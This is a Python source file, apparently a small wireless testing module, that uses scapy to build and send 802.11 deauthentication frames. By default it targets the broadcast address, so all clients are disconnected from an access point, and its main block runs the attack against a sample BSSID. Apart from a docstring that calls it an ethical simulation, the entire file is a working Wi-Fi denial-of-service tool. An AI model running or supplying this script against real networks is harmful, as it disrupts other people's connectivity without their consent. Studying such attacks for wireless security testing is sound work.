"""Ethical attack simulations (deauth, probe)."""

from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import time

class DeauthAttack:
    """Send deauthentication packets to disassociate clients (for testing)."""

    def __init__(self, iface="wlan0mon"):
        self.iface = iface

    def deauth_client(self, target_bssid, client_mac="ff:ff:ff:ff:ff:ff", count=5, interval=0.1):
        """
        Send deauth frames.
        target_bssid: AP MAC
        client_mac: client to target (broadcast = all)
        """
        print(f"[*] Sending {count} deauth packets to {client_mac} from {target_bssid}")
        pkt = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
        for i in range(count):
            sendp(pkt, iface=self.iface, verbose=False)
            time.sleep(interval)
        print("[+] Deauth attack completed.")

if __name__ == "__main__":
    deauther = DeauthAttack()
    deauther.deauth_client("00:11:22:33:44:55", count=3)